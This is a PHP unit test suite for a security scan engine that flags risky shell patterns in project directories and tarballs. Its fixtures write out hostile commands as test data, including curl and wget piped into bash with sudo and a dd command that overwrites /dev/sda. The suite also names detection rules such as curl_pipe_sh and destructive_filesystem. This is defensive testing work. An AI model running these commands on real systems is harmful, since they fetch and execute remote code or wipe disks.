<?php

namespace Tests\Unit\Security;

use App\Enums\RiskLevel;
use App\Security\ScanEngine;
use Tests\Concerns\BuildsTarballs;
use Tests\TestCase;

class ScanEngineTest extends TestCase
{
    use BuildsTarballs;

    private ScanEngine $engine;

    protected function setUp(): void
    {
        parent::setUp();
        $this->engine = $this->app->make(ScanEngine::class);
    }

    public function test_clean_directory_produces_no_findings(): void
    {
        $result = $this->engine->scanDirectory($this->fixture('clean'));

        $this->assertSame(RiskLevel::None, $result->riskLevel);
        $this->assertCount(0, $result->findings);
        $this->assertNotEmpty($result->rulesRun);
    }

    public function test_malicious_directory_reports_high_risk_and_matching_rules(): void
    {
        $result = $this->engine->scanDirectory($this->fixture('malicious'));

        $this->assertSame(RiskLevel::High, $result->riskLevel);
        $this->assertNotEmpty($result->findings);

        $rules = array_unique(array_map(fn ($finding) => $finding->rule, $result->findings));
        $this->assertContains('curl_pipe_sh', $rules);
        $this->assertContains('sudo', $rules);
        $this->assertContains('decode_and_execute', $rules);
        $this->assertContains('permission_ownership', $rules);
        $this->assertContains('shell_profile', $rules);
        $this->assertContains('package_manager', $rules);
        $this->assertContains('destructive_filesystem', $rules);
    }

    public function test_findings_carry_file_paths_and_line_numbers(): void
    {
        $result = $this->engine->scanDirectory($this->fixture('malicious'));

        $this->assertNotEmpty($result->findings);

        $filePaths = array_unique(array_column(
            array_map(fn ($finding) => $finding->toArray(), $result->findings),
            'file',
        ));

        $this->assertContains('setup.sh', $filePaths);
        $this->assertContains('persist.sh', $filePaths);
    }

    public function test_scan_tarball_extracts_and_scans_exact_content(): void
    {
        $tarball = $this->tarballFromDirectory($this->fixture('malicious'));

        $result = $this->engine->scanTarball($tarball);

        $this->assertSame(RiskLevel::High, $result->riskLevel);
        $this->assertNotEmpty($result->findings);
    }

    public function test_documentation_only_findings_are_capped_at_low(): void
    {
        // A README's curl | sh install snippet is descriptive, not code.
        $dir = $this->scanDir([
            'README.md' => "# Demo\n\nInstall with:\n\n```sh\ncurl -sSL https://x.io/install.sh | sh\n```",
        ]);

        $result = $this->engine->scanDirectory($dir);

        $this->assertSame(RiskLevel::Low, $result->riskLevel);
        $this->assertNotEmpty($result->findings);
        $this->assertContains('README.md', array_unique(array_column(
            array_map(fn ($finding) => $finding->toArray(), $result->findings),
            'file',
        )));
    }

    public function test_code_findings_determine_risk_above_documentation_findings(): void
    {
        // High-severity patterns in a README must not override a real code file.
        $dir = $this->scanDir([
            'README.md' => "# Demo\n\n```sh\nwget -qO- https://x.io/x.sh | bash\n```",
            'install.sh' => "curl -sSL https://x.io/payload.sh | sudo bash\n",
        ]);

        $result = $this->engine->scanDirectory($dir);

        // install.sh is code → curl | sudo bash is High.
        $this->assertSame(RiskLevel::High, $result->riskLevel);
    }

    public function test_overlapping_rule_patterns_do_not_duplicate_findings(): void
    {
        // This line matches both curl_pipe_sh patterns; it must appear once.
        $dir = $this->scanDir([
            'README.md' => "# Demo\n\n```sh\ncurl -sSL https://x.io/x.sh | sh\n```",
        ]);

        $result = $this->engine->scanDirectory($dir);

        $curlPipe = array_values(array_filter(
            $result->findings,
            fn ($finding) => $finding->rule === 'curl_pipe_sh',
        ));
        $this->assertCount(1, $curlPipe);
    }

    public function test_manifest_date_format_with_bare_dd_is_not_a_disk_write(): void
    {
        // "dd MMM" is a date-format token, not the `dd` disk utility. A bare
        // `dd` without an `of=` output operand must not be flagged.
        $dir = $this->scanDir([
            'manifest.json' => <<<'JSON'
                {
                  "id": "demo.clock",
                  "format": "dd MMM yyyy",
                  "description": "Shows the date as dd MMM yyyy in the panel."
                }
                JSON,
        ]);

        $result = $this->engine->scanDirectory($dir);

        $diskWrites = array_filter(
            $result->findings,
            fn ($finding) => $finding->rule === 'destructive_filesystem',
        );
        $this->assertSame([], array_values($diskWrites));
        $this->assertSame(RiskLevel::None, $result->riskLevel);
    }

    public function test_dd_with_output_operand_is_reported_as_disk_write(): void
    {
        $dir = $this->scanDir([
            'wipe.sh' => 'dd if=/dev/zero of=/dev/sda bs=4M status=progress oflag=direct',
        ]);

        $result = $this->engine->scanDirectory($dir);

        $diskWrites = array_values(array_filter(
            $result->findings,
            fn ($finding) => $finding->rule === 'destructive_filesystem',
        ));
        $this->assertCount(1, $diskWrites);
        $this->assertStringContainsString('/dev/sda', $diskWrites[0]->snippet);
        $this->assertSame(RiskLevel::High, $result->riskLevel);
    }

    private function scanDir(array $files): string
    {
        $dir = sys_get_temp_dir().'/scan-'.bin2hex(random_bytes(6));

        foreach ($files as $relative => $contents) {
            $full = $dir.'/'.$relative;
            @mkdir(dirname($full), 0777, true);
            file_put_contents($full, $contents);
        }

        return $dir;
    }

    private function fixture(string $name): string
    {
        return base_path("tests/Fixtures/security/{$name}");
    }
}
